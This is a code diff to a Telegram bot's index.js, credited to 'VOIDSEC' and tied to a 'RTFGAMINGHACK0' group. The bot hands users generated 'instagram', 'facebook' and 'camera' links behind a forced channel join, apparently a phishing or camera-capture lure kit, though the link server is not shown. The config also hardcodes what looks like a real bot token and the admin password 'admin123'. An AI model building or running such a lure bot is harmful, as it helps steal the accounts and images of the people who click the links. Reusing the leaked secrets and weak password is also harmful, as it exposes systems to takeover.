@@ -1,4 +1,4 @@
-// ====================== index.js (COMPLETE WORKING) ======================
+// ====================== index.js (FULLY WORKING - FIXED) ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
  * Complete Bot with Admin Panel - Photo Management
@@ -8,15 +8,12 @@ process.env.NTBA_FIX_350 = 1;
 
 // ====================== CONFIGURATION ======================
 const config = {
-    // ✅ TOKEN DAAL DIYA HAI
     mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
-    
-    S7: '@ZoroXbug',
-    port: 3000,
+    S7: '@RTFGAMMING',
+    port: process.env.PORT || 3000,
     love: 'S7_LOVE_2026',
     adminPassword: 'admin123',
     
-    // ✅ Aapke channel aur group IDs
     channelId: '-1003004551707',
     groupId: '-1003559518526',
     group: 'https://t.me/RTFGAMINGHACK0',
@@ -26,8 +23,6 @@ const config = {
 };
 
 console.log('✅ Bot Token loaded successfully!');
-console.log('📌 Channel ID:', config.channelId);
-console.log('📌 Group ID:', config.groupId);
 
 // ====================== DEPENDENCIES ======================
 const express = require('express');
@@ -334,7 +329,6 @@ S7.getMe().then((botInfo) => {
     console.log(`✅ Bot ID: ${botInfo.id}`);
 }).catch(err => {
     console.error('❌ Bot Start Error:', err.message);
-    console.error('📌 Token may be invalid or bot is already running elsewhere');
     process.exit(1);
 });
 
@@ -370,30 +364,13 @@ const protectionButtons = {
 
 async function SendLoveSYMenu(chatId, firstName) {
     const message = '𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻ ';
+    const menuText = SYloveMenu(firstName, message);
     
-    try {
-        const response = await fetch(`http://localhost:${config.port}/api/bot/random-photo`);
-        const data = await response.json();
-        
-        if (data.success && data.photo) {
-            const photoUrl = `http://localhost:${config.port}${data.photo.url}`;
-            await S7.sendPhoto(chatId, photoUrl, {
-                caption: SYloveMenu(firstName, message),
-                parse_mode: 'HTML',
-                reply_markup: LOVESY
-            });
-        } else {
-            await S7.sendMessage(chatId, SYloveMenu(firstName, message), {
-                parse_mode: 'HTML',
-                reply_markup: LOVESY
-            });
-        }
-    } catch (err) {
-        await S7.sendMessage(chatId, SYloveMenu(firstName, message), {
-            parse_mode: 'HTML',
-            reply_markup: LOVESY
-        });
-    }
+    // ✅ FIX: Always send as text message (not photo) to avoid caption errors
+    await S7.sendMessage(chatId, menuText, {
+        parse_mode: 'HTML',
+        reply_markup: LOVESY
+    });
 }
 
 const protectionMessage = `<b>Access Denied ❌</b>\n\nPlease join our group and channel to use this bot.`;
@@ -412,6 +389,7 @@ function SYLoVe(commands) {
                         reply_markup: protectionButtons 
                     });
                 }
+                console.log(`📩 Command: ${cmd} from ${msg.from.first_name}`);
                 await SendLoveSYMenu(msg.chat.id, msg.from.first_name);
             } catch (err) {
                 console.error('Command Error:', err.message);
@@ -429,6 +407,8 @@ S7.on('callback_query', async (q) => {
     const mid = q.message.message_id;
     const cid = q.message.chat.id;
 
+    console.log(`🔘 Callback: ${q.data} from ${q.from.first_name}`);
+
     if (q.data === "check_join") {
         const isMember = await IsSYLovsToo(uid);
         if (isMember) {
@@ -442,9 +422,9 @@ S7.on('callback_query', async (q) => {
 
     if (q.data === "gen_instagram" || q.data === "gen_facebook" || q.data === "gen_camera") {
         const platform = q.data.replace('gen_', '');
-        await S7.editMessageCaption(SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'), {
-            chat_id: cid,
-            message_id: mid,
+        
+        // ✅ FIX: Send loading message as text
+        const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'), {
             parse_mode: 'HTML',
             reply_markup: SYBack
         });
@@ -457,16 +437,19 @@ S7.on('callback_query', async (q) => {
             const data = await response.json();
             
             const finalMsg = `𝙔𝙤𝙪𝙧 𝙇𝙞𝙣𝙠:\n   ${data.url}`;
-            await S7.editMessageCaption(SYloveMenu(q.from.first_name, finalMsg), {
+            
+            // ✅ FIX: Edit the message (not caption)
+            await S7.editMessageText(SYloveMenu(q.from.first_name, finalMsg), {
                 chat_id: cid,
-                message_id: mid,
+                message_id: loadingMsg.message_id,
                 parse_mode: 'HTML',
                 reply_markup: getRegenMarkup(platform)
             });
         } catch (err) {
-            await S7.editMessageCaption(SYloveMenu(q.from.first_name, '❌ Error generating link'), {
+            console.error('Link Error:', err.message);
+            await S7.editMessageText(SYloveMenu(q.from.first_name, '❌ Error generating link'), {
                 chat_id: cid,
-                message_id: mid,
+                message_id: loadingMsg.message_id,
                 parse_mode: 'HTML',
                 reply_markup: SYBack
             });
@@ -475,9 +458,20 @@ S7.on('callback_query', async (q) => {
 
     if (q.data === "regen_instagram" || q.data === "regen_facebook" || q.data === "regen_camera") {
         const platform = q.data.replace('regen_', '');
-        await S7.editMessageCaption(SYloveMenu(q.from.first_name, '𝙍𝙚𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙉𝙚𝙬 𝙇𝙞𝙣𝙠... 🔁'), {
-            chat_id: cid,
-            message_id: mid,
+        
+        // Delete old link from storage
+        let db = {};
+        const SYLovePath = path.join(DATA_DIR, 'user_links.json');
+        if (fs.existsSync(SYLovePath)) {
+            db = JSON.parse(fs.readFileSync(SYLovePath, 'utf8'));
+            const username = q.from.username || q.from.first_name || uid;
+            if (db[username]) {
+                delete db[username][platform];
+                fs.writeFileSync(SYLovePath, JSON.stringify(db, null, 2));
+            }
+        }
+        
+        const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, '𝙍𝙚𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙉𝙚𝙬 𝙇𝙞𝙣𝙠... 🔁'), {
             parse_mode: 'HTML',
             reply_markup: SYBack
         });
@@ -490,16 +484,17 @@ S7.on('callback_query', async (q) => {
             const data = await response.json();
             
             const finalMsg = `𝙔𝙤𝙪𝙧 𝙉𝙚𝙬 𝙇𝙞𝙣𝙠:\n   ${data.url}`;
-            await S7.editMessageCaption(SYloveMenu(q.from.first_name, finalMsg), {
+            await S7.editMessageText(SYloveMenu(q.from.first_name, finalMsg), {
                 chat_id: cid,
-                message_id: mid,
+                message_id: loadingMsg.message_id,
                 parse_mode: 'HTML',
                 reply_markup: getRegenMarkup(platform)
             });
         } catch (err) {
-            await S7.editMessageCaption(SYloveMenu(q.from.first_name, '❌ Error generating link'), {
+            console.error('Regen Error:', err.message);
+            await S7.editMessageText(SYloveMenu(q.from.first_name, '❌ Error generating link'), {
                 chat_id: cid,
-                message_id: mid,
+                message_id: loadingMsg.message_id,
                 parse_mode: 'HTML',
                 reply_markup: SYBack
             });
@@ -507,6 +502,7 @@ S7.on('callback_query', async (q) => {
     }
 
     if (q.data === "back") {
+        await S7.deleteMessage(cid, mid);
         await SendLoveSYMenu(cid, q.from.first_name);
     }
 });
